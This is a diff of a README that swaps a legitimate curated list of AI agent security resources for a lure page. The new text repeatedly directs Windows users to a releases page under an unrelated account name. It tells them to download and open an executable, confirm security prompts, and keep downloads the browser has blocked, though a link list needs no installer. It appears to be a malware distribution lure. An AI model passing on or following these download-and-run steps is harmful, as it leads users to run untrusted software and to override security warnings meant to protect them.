@@ -1,124 +1,207 @@
-# Awesome Agent Security [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+# 🛡️ awesome-agent-security - Guide to safer AI agent setups
 
-> A curated list of resources for AI agent identity, authorization, coordination, and security.
+[![Download the app](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/nephritispeepshow717/awesome-agent-security/releases)
 
-As AI agents move from demos to production, securing them becomes critical. This list covers tools, frameworks, papers, standards, and best practices for making AI agents trustworthy.
+## 📥 Download
 
-**Contributions welcome!** See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Visit this page to download: https://github.com/nephritispeepshow717/awesome-agent-security/releases
 
----
+Choose the latest release, then download the Windows file you see there. After the file finishes downloading, open it from your Downloads folder and follow the on-screen steps.
 
-## Contents
+## 🔎 What this is
 
-- [Identity and Authentication](#identity-and-authentication)
-- [Authorization and Policy](#authorization-and-policy)
-- [Agent Coordination](#agent-coordination)
-- [Sandboxed Execution](#sandboxed-execution)
-- [Security Monitoring](#security-monitoring)
-- [Standards and Protocols](#standards-and-protocols)
-- [Papers and Research](#papers-and-research)
-- [Incidents and Case Studies](#incidents-and-case-studies)
-- [Talks and Presentations](#talks-and-presentations)
-- [Books and Guides](#books-and-guides)
+awesome-agent-security is a curated list of resources for AI agent identity, authorization, coordination, and security.
 
----
+It helps you find practical material on:
+- agent identity
+- access control
+- secure agent coordination
+- LLM security
+- MCP security
+- DevSecOps for agent systems
+- general cybersecurity for AI tools
 
-## Identity and Authentication
+## ✅ What you need
 
-*Tools and platforms for giving AI agents verifiable identities.*
+Before you start, make sure you have:
+- a Windows PC
+- an internet connection
+- enough free space to save the download
+- permission to run files on your computer
 
-- [Authora Identity](https://authora.dev) - Cryptographic agent identities (Ed25519), RBAC, delegation chains (RFC 8693), MCP authorization, policy engines, approval workflows, audit logging. SDKs in TypeScript, Python, Rust, Go.
-- [Permit.io](https://permit.io) - Fine-grained authorization with agentic identity support. Intent-based identity, MCP gateway, built on OPA/OPAL.
-- [Oso](https://osohq.com) - Authorization framework with Polar policy language. Agent Security product with scope/watch/enforce/audit.
-- [SPIFFE/SPIRE](https://spiffe.io) - Secure Production Identity Framework for Everyone. Workload identity standard applicable to agent systems.
-- [Sigstore](https://sigstore.dev) - Keyless signing for software artifacts. Applicable to agent action signing.
+If your browser asks where to save the file, choose a folder you can find later, such as Downloads or Desktop.
 
-## Authorization and Policy
+## 🚀 Getting started
 
-*Frameworks for controlling what AI agents can do.*
+1. Open the download page: https://github.com/nephritispeepshow717/awesome-agent-security/releases
+2. Look for the newest release at the top of the page
+3. Open the release page
+4. Find the Windows download file
+5. Download the file to your computer
+6. Open the file after the download finishes
+7. Follow the setup steps shown on your screen
+8. Start using the resource list
 
-- [OPA (Open Policy Agent)](https://openpolicyagent.org) - General-purpose policy engine using Rego language. Widely used for infrastructure policy, adaptable for agent authorization.
-- [Cedar](https://www.cedarpolicy.com) - Policy language by AWS for fine-grained authorization. Used in Amazon Verified Permissions.
-- [Casbin](https://casbin.org) - Authorization library supporting ACL, RBAC, ABAC models. Implementations in Go, Java, Node.js, Python.
-- [OpenFGA](https://openfga.dev) - Fine-grained authorization inspired by Google Zanzibar. Good for relationship-based agent permissions.
-- [Cerbos](https://cerbos.dev) - Access control with YAML policies. API-first, self-hosted.
+## 🪟 Install on Windows
 
-## Agent Coordination
+Because this project is delivered through GitHub Releases, the process on Windows is simple.
 
-*Tools for coordinating multiple AI agents working together.*
+1. Go to the release page
+2. Download the latest Windows file
+3. Wait for the browser to finish
+4. Open the downloaded file
+5. If Windows asks for permission, choose Run or Open
+6. If a security prompt appears, confirm that you want to continue
+7. Finish the setup steps if the file includes an installer
+8. Open the app or local page if the release provides one
 
-- [AgentSync](https://authora.dev/products/agentsync) - File-level locking, sprint management, messaging, and coordination for AI coding agents on shared codebases.
-- [LangGraph](https://github.com/langchain-ai/langgraph) - Framework for building stateful, multi-agent applications with LangChain.
-- [CrewAI](https://github.com/crewAIInc/crewAI) - Framework for orchestrating autonomous AI agents with role-based task execution.
-- [AutoGen](https://github.com/microsoft/autogen) - Microsoft's framework for building multi-agent conversational systems.
-- [OpenHands](https://github.com/All-Hands-AI/OpenHands) - Platform for AI software development agents.
+If the download is a zip file, right-click it and choose Extract All before opening the contents.
 
-## Sandboxed Execution
+## 🧭 What you can use it for
 
-*Secure environments for running AI agent code.*
+This repository is useful when you want a clear list of trusted reading and reference material for AI agent security work.
 
-- [AgentNet](https://authora.dev/products/agentnet) - Task execution marketplace with sandboxed workers, encrypted vault, Security Intelligence Platform (SIP).
-- [E2B](https://e2b.dev) - Open-source sandboxed execution using Firecracker microVMs. Code interpretation and data analysis.
-- [Modal](https://modal.com) - Cloud infrastructure for AI with sandboxed containers, GPU scaling, and batch processing.
-- [Daytona](https://daytona.io) - Secure infrastructure for running AI-generated code with isolated environments.
-- [Fly.io Machines](https://fly.io/docs/machines/) - Lightweight VMs for running untrusted workloads at the edge.
+You can use it to explore:
+- identity for agents and services
+- who can do what in an agent system
+- safe tool use
+- coordination between multiple agents
+- security checks for AI workflows
+- model and prompt safety topics
+- access patterns for MCP-based tools
 
-## Security Monitoring
+## 📚 Common topics covered
 
-*Detecting and responding to AI agent threats.*
+The curated list is built around practical security themes.
 
-- [Authora SIP](https://authora.dev/security) - Security Intelligence Platform with 36 detection rules, 8 SIEM export connectors (Splunk, Datadog, PagerDuty), SOAR callback API, OCSF/CEF compliance.
-- [Caldera](https://caldera.mitre.org) - Automated adversary emulation by MITRE. Adaptable for testing agent security.
-- [Falco](https://falco.org) - Cloud-native runtime security. Detects anomalous behavior in containers running agents.
-- [Wiz](https://wiz.io) - Cloud security platform with AI workload protection.
+### 🔐 Agent identity
+Learn how to tell one agent from another, and how systems can verify who is acting.
 
-## Standards and Protocols
+### 🛂 Authorization
+See how to control what an agent can access, change, or send.
 
-*Standards relevant to AI agent security.*
+### 🤝 Coordination
+Find material on how multiple agents work together without crossing trust boundaries.
 
-- [MCP (Model Context Protocol)](https://modelcontextprotocol.io) - Protocol for AI model-tool interaction. Defines how agents access external tools and data.
-- [RFC 8693 - OAuth 2.0 Token Exchange](https://tools.ietf.org/html/rfc8693) - Standard for delegated access. Foundation for user-to-agent and agent-to-agent delegation.
-- [OCSF (Open Cybersecurity Schema Framework)](https://schema.ocsf.io) - Standardized security event format. Used by SIP for SIEM integration.
-- [NIST AI Risk Management Framework](https://www.nist.gov/artificial-intelligence/ai-risk-management-framework) - Guidelines for managing AI risks including agent autonomy.
-- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) - Security risks for LLM-based systems including prompt injection and insecure tool use.
-- [Ed25519](https://ed25519.cr.yp.to) - High-speed, high-security digital signature scheme used for agent identity.
+### 🧱 AI security
+Review resources on prompt safety, data handling, and attack paths that affect AI systems.
 
-## Papers and Research
+### 🧰 MCP
+Explore resources related to Model Context Protocol use, permissions, and safe integration.
 
-*Academic and industry research on AI agent security.*
+### 🛡️ DevSecOps
+Use security-focused practices that fit into build, test, and deployment flows.
 
-- [Toolformer: Language Models Can Teach Themselves to Use Tools](https://arxiv.org/abs/2302.04761) - Foundational paper on LLM tool use.
-- [ReAct: Synergizing Reasoning and Acting in Language Models](https://arxiv.org/abs/2210.03629) - Reasoning + acting paradigm for agents.
-- [The Landscape of Emerging AI Agent Architectures](https://arxiv.org/abs/2404.11584) - Survey of multi-agent system architectures.
-- [Prompt Injection Attacks Against LLM-Integrated Applications](https://arxiv.org/abs/2306.05499) - Security analysis of prompt injection in agent systems.
-- [Not What You've Signed Up For: Compromising Real-World LLM-Integrated Applications](https://arxiv.org/abs/2302.12173) - Real-world attack vectors on LLM tool-calling systems.
+## 🖥️ System fit
 
-## Incidents and Case Studies
+This project is meant to work well for a normal Windows user who wants a simple path to the resources.
 
-*Real-world security incidents involving AI agents.*
+A typical setup includes:
+- Windows 10 or Windows 11
+- a modern web browser
+- a PDF reader if some resources are in PDF form
+- basic file access for downloads and extracts
 
-- [LiteLLM Supply Chain Attack (2025)](https://www.wiz.io/blog/litellm-supply-chain-attack) - Compromised dependency in widely-used LLM proxy.
-- [29 Million Secrets Leaked on GitHub (2024)](https://blog.gitguardian.com/secrets-leaks-2024-report/) - AI coding tools accelerating secret exposure.
-- [ChatGPT Plugin Permission Escalation](https://embracethered.com/blog/posts/2023/chatgpt-plugin-vulns/) - Demonstration of cross-plugin attacks via shared context.
+If the release includes a web-based bundle, you can open it in your browser. If it includes a file package, you can keep it in a folder and use it from there.
 
-## Talks and Presentations
+## 🧪 First run checklist
 
-- [Simon Willison - Prompt Injection and AI Security](https://simonwillison.net/tags/security/) - Ongoing coverage of LLM security issues.
-- [OWASP AppSec - LLM Security](https://owasp.org/www-project-top-10-for-large-language-model-applications/) - Community presentations on LLM application security.
+After you download and open the release, check the following:
+- the file opened without errors
+- the browser or app shows the expected project name
+- the list of resources loads fully
+- links open in a new tab or the same browser window
+- the content looks complete and readable
 
-## Books and Guides
+If something looks off, download the latest release again from the same page.
 
-- [LLM Security Guide](https://llmsecurity.net) - Comprehensive guide to securing LLM applications.
-- [Anthropic's Responsible Scaling Policy](https://www.anthropic.com/index/anthropics-responsible-scaling-policy) - Framework for safely deploying capable AI systems.
+## 📁 Typical release contents
 
----
+A release for this project may include:
+- a Windows-ready package
+- a README or index page
+- a resource list organized by topic
+- links to external articles, tools, and reference docs
+- files for offline viewing
 
-## Contributing
+The layout is built to help you scan by topic and move straight to the parts you need.
 
-Contributions are welcome! Please read the [contribution guidelines](CONTRIBUTING.md) first.
+## 🛠️ How to use the list
 
-## License
+Use the list in a simple way:
+- start with the main topic that fits your task
+- open one resource at a time
+- save useful links in your browser
+- return to the list when you need a different topic
+- check back for new releases when you want fresh material
 
-[![CC0](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/cc-zero.svg)](https://creativecommons.org/publicdomain/zero/1.0/)
+If you work with AI agents, this list can help you build a better view of the security risks around identity, access, and coordination.
 
-This list is released under CC0. You can copy, modify, and distribute it without asking permission.
+## 🔍 Topics in this repository
+
+This repository covers:
+- agent-identity
+- ai-agents
+- ai-security
+- authorization
+- awesome
+- awesome-list
+- cybersecurity
+- devsecops
+- llm-security
+- mcp
+- security
+
+## 🧩 Who this is for
+
+This is a good fit for:
+- people who want to learn about AI agent security
+- teams that build with AI tools
+- security staff who need a reference list
+- users who want a starting point for safe agent design
+- readers who want trusted links in one place
+
+## 🌐 Download again later
+
+If you need the file again, return to the release page:
+https://github.com/nephritispeepshow717/awesome-agent-security/releases
+
+From there, you can get the latest version and replace older files if needed
+
+## 🧾 File handling tips
+
+Keep the downloaded file in a folder you can find again.
+If you use a zip file, extract it before opening the contents.
+If your browser blocks the download, choose Keep if you trust the source.
+If Windows shows a prompt, review the file name before you open it.
+
+## 🔧 Common problems
+
+### The file will not open
+Download it again from the release page and make sure the transfer finished.
+
+### The browser shows a blocked download
+Choose the option to keep the file if you want to continue.
+
+### The page looks empty
+Refresh the release page and check for the newest release near the top.
+
+### The file is a zip archive
+Extract the archive first, then open the extracted files.
+
+### The content does not load
+Check your internet connection and open the release page again
+
+## 📌 Release link
+
+Download page: https://github.com/nephritispeepshow717/awesome-agent-security/releases
+
+Use that page to download the latest Windows release and open it on your PC
+
+## 🗂️ Quick path
+
+1. Open the release page
+2. Download the latest file
+3. Open the downloaded file
+4. Follow the setup steps
+5. Start using the resource list
